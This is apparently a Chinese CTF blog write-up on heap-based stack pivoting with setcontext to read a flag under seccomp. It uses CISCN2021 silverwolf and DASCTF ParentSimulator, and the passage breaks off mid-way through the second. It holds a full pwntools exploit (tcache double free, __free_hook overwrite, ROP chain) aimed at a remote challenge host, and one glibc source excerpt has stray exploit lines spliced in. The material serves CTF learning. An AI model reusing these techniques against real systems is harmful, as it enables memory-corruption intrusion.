    <content type="html"><![CDATA[<blockquote><p>现在的比赛，越来越卷了，所以出题人为了让选手难受一般都会开始沙盒这时候只能进行orw，不过在栈里面这种方式还是常见。但是在堆利用当中我们更多的是修改hook为system或者one_gadget，为了能够实现orw就出现了新的手法 堆中栈迁移</p></blockquote><h2 id="Glibc2-29以下"><a href="#Glibc2-29以下" class="headerlink" title="Glibc2.29以下"></a>Glibc2.29以下</h2><p>首先先看一下在glibc2.29以下的此类利用方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0x00007f1c03351180 &lt;+0&gt;:push   rdi</span><br><span class="line">0x00007f1c03351181 &lt;+1&gt;:lea    rsi,[rdi+0x128]</span><br><span class="line">0x00007f1c03351188 &lt;+8&gt;:xor    edx,edx</span><br><span class="line">0x00007f1c0335118a &lt;+10&gt;:mov    edi,0x2</span><br><span class="line">0x00007f1c0335118f &lt;+15&gt;:mov    r10d,0x8</span><br><span class="line">0x00007f1c03351195 &lt;+21&gt;:mov    eax,0xe</span><br><span class="line">0x00007f1c0335119a &lt;+26&gt;:syscall </span><br><span class="line">0x00007f1c0335119c &lt;+28&gt;:pop    rdi</span><br><span class="line">0x00007f1c0335119d &lt;+29&gt;:cmp    rax,0xfffffffffffff001</span><br><span class="line">0x00007f1c033511a3 &lt;+35&gt;:jae    0x7f1c03351200 &lt;setcontext+128&gt;</span><br><span class="line">0x00007f1c033511a5 &lt;+37&gt;:mov    rcx,QWORD PTR [rdi+0xe0]</span><br><span class="line">0x00007f1c033511ac &lt;+44&gt;:fldenv [rcx]</span><br><span class="line">0x00007f1c033511ae &lt;+46&gt;:ldmxcsr DWORD PTR [rdi+0x1c0]</span><br><span class="line">0x00007f1c033511b5 &lt;+53&gt;:mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">0x00007f1c033511bc &lt;+60&gt;:mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">0x00007f1c033511c3 &lt;+67&gt;:mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">0x00007f1c033511c7 &lt;+71&gt;:mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">0x00007f1c033511cb &lt;+75&gt;:mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">0x00007f1c033511cf &lt;+79&gt;:mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">0x00007f1c033511d3 &lt;+83&gt;:mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">0x00007f1c033511d7 &lt;+87&gt;:mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">0x00007f1c033511de &lt;+94&gt;:push   rcx</span><br><span class="line">0x00007f1c033511df &lt;+95&gt;:mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">0x00007f1c033511e3 &lt;+99&gt;:mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">0x00007f1c033511ea &lt;+106&gt;:mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">0x00007f1c033511f1 &lt;+113&gt;:mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">0x00007f1c033511f5 &lt;+117&gt;:mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">0x00007f1c033511f9 &lt;+121&gt;:mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">0x00007f1c033511fd &lt;+125&gt;:xor    eax,eax</span><br><span class="line">0x00007f1c033511ff &lt;+127&gt;:ret    </span><br></pre></td></tr></table></figure><p>可以看到这里是以rdi为基地址向其他寄存器写入值，并且这里可以控制rsp和rip，虽然上面没有直接向rip写，但是上面是先写在rcx再将rcx进栈随后ret，所以rcx的值其实也就是最后rip的值。</p><h3 id="CISCN2021-silverwolf"><a href="#CISCN2021-silverwolf" class="headerlink" title="CISCN2021-silverwolf"></a>CISCN2021-silverwolf</h3><p>题目的代码很清晰，流程很容易分析所以自己下去分析一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_1144, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; chunk )</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete存在很明显的UAF漏洞，泄漏heap地址和libc地址这里就不在赘述，这里提一下tcache double free的检测，这道提的libc版本是2.27-3ubuntu1.3虽然是2.27但是已经加了检测机制，所以可以当作2.29来打，这里先看一下检测的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们chunk进入tcache之后会将key位其实也就是bk位设置为tcache地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">    &#123;</span><br><span class="line">        tcache_entry *tmp;</span><br><span class="line">        LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">        <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">             tmp;</span><br><span class="line">             tmp = tmp-&gt;next)</span><br><span class="line">            <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">        <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">    &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;r.recvuntil(b<span class="number">&#x27;</span>Please input index?<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    r.sendline(bytes(str(idx), encoding=&#x27;</span>utf8<span class="number">&#x27;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再验证free的chunk的key位是否为tcache地址，所以只需要覆盖掉就好了。</p><p>所以思路就很简单了，只需要通过double free控制tcache struct，然后覆盖掉free_hook为setcontext+53，不过需要注意的是这里的堆能写入的最大值为0x78所以，我们在构造rdi+0xa0和rdi+0xa8时需要用到两个chunk，还有一点很坑的就是在进行rop时不能直接调用open</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x00007f1c0340ed49 &lt;+57&gt;:test   eax,eax</span><br><span class="line">0x00007f1c0340ed4b &lt;+59&gt;:jne    0x7f1c0340edb6 &lt;__libc_open64+166&gt;</span><br><span class="line">0x00007f1c0340ed4d &lt;+61&gt;:mov    edx,esi</span><br><span class="line">0x00007f1c0340ed4f &lt;+63&gt;:mov    eax,0x101</span><br><span class="line">0x00007f1c0340ed54 &lt;+68&gt;:mov    rsi,rdi</span><br><span class="line">0x00007f1c0340ed57 &lt;+71&gt;:mov    edi,0xffffff9c</span><br><span class="line">0x00007f1c0340ed5c &lt;+76&gt;:syscall </span><br></pre></td></tr></table></figure><p>反汇编存在以下几行，这里进行syscall时rax其实并不是2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; seccomp-tools dump ./silverwolf</span><br><span class="line"></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0008</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000002  <span class="keyword">if</span> (A != open) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>可以看到这里的沙盒限制了，所以直接使用地址调用open是不行的需要自己赋值rax，最后这里给出上面题目的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./silverwolf&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./silverwolf&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>, <span class="number">28017</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">options</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(options), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    create(<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">0x50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    create(<span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x78</span>)</span><br><span class="line">delete()</span><br><span class="line">edit(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_addr-<span class="number">0x1920</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base=&gt;&quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">create(<span class="number">0x78</span>)</span><br><span class="line">create(<span class="number">0x78</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)</span><br><span class="line">edit(payload)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">main_arena_96 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base=&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">__free_hook = libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">read_addr = libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base+libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">setcontext_addr = libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">syscall_addr = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall\nret&#x27;</span>)))</span><br><span class="line">pop_rdi = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))</span><br><span class="line">pop_rsi = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>)))</span><br><span class="line">pop_rdx = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>)))</span><br><span class="line">pop_rax = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rax\nret&#x27;</span>)))</span><br><span class="line">ret_addr = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;ret&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;\x02&#x27;</span>*<span class="number">2</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;\x03&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(heap_base+<span class="number">0x400</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(heap_base+<span class="number">0x1130</span>+<span class="number">0x10</span>) + \</span><br><span class="line">    p64(heap_base+<span class="number">0x1560</span>+<span class="number">0x10</span>)</span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">flag_addr = heap_base+<span class="number">0x400</span></span><br><span class="line">bss = libc_base+libc.bss()+<span class="number">0x100</span></span><br><span class="line">rop_chain = p64(pop_rdi)+p64(flag_addr)+p64(pop_rax) + \</span><br><span class="line">    p64(constants.SYS_open)+p64(syscall_addr)</span><br><span class="line">rop_chain += p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(bss)+p64(pop_rdx) + \</span><br><span class="line">    p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">rop_chain += p64(pop_rdi)+p64(bss)+p64(puts_addr)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x78</span>)</span><br><span class="line">delete()</span><br><span class="line">edit(p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">create(<span class="number">0x78</span>)</span><br><span class="line">edit(rop_chain)</span><br><span class="line">rop_addr = heap_base+<span class="number">0x1560</span>+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">delete()</span><br><span class="line">edit(p64(heap_base+<span class="number">0x10c0</span>+<span class="number">0x10</span>))</span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+p64(rop_addr)+p64(ret_addr))</span><br><span class="line">create(<span class="number">0x78</span>)</span><br><span class="line">edit(p64(setcontext_addr))</span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="Glibc2-29以上"><a href="#Glibc2-29以上" class="headerlink" title="Glibc2.29以上"></a>Glibc2.29以上</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x00007f37b1e420dd &lt;+61&gt;:mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">0x00007f37b1e420e4 &lt;+68&gt;:mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">0x00007f37b1e420eb &lt;+75&gt;:mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">0x00007f37b1e420ef &lt;+79&gt;:mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">0x00007f37b1e420f3 &lt;+83&gt;:mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">0x00007f37b1e420f7 &lt;+87&gt;:mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">0x00007f37b1e420fb &lt;+91&gt;:mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">... ...</span><br><span class="line">0x00007f37b1e421c6 &lt;+294&gt;:mov    rcx,QWORD PTR [rdx+0xa8]</span><br><span class="line">0x00007f37b1e421cd &lt;+301&gt;:push   rcx</span><br><span class="line">0x00007f37b1e421ce &lt;+302&gt;:mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">0x00007f37b1e421d2 &lt;+306&gt;:mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">0x00007f37b1e421d6 &lt;+310&gt;:mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">0x00007f37b1e421dd &lt;+317&gt;:mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">0x00007f37b1e421e1 &lt;+321&gt;:mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">0x00007f37b1e421e5 &lt;+325&gt;:mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">0x00007f37b1e421ec &lt;+332&gt;:xor    eax,eax</span><br><span class="line">0x00007f37b1e421ee &lt;+334&gt;:ret</span><br></pre></td></tr></table></figure><p>可以看到在glibc2.29以上的版本是以rdx作为索引的，这时我们就需要一个gadget可以操作rdx了<code>getkeyserv_handle</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00007f3ddba96930 &lt;+576&gt;:mov    rdx,QWORD PTR [rdi+0x8]</span><br><span class="line">0x00007f3ddba96934 &lt;+580&gt;:mov    QWORD PTR [rsp],rax</span><br><span class="line">0x00007f3ddba96938 &lt;+584&gt;:call   QWORD PTR [rdx+0x20]</span><br></pre></td></tr></table></figure><p>所以此时我们就可以根据rdi继续操作rdx实现栈劫持</p><h3 id="2021DASCTF-3月ParentSimulator"><a href="#2021DASCTF-3月ParentSimulator" class="headerlink" title="2021DASCTF 3月ParentSimulator"></a>2021DASCTF 3月ParentSimulator</h3><p>题目的流程很是很简单，结构很清晰可以分析出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_196B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input index?&quot;</span>);</span><br><span class="line">  LODWORD(v0) = input_int();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = chunk_arr[v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(chunk_arr[v2]);</span><br><span class="line">      chunk_inuse[v2] = <span class="number">0</span>;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span 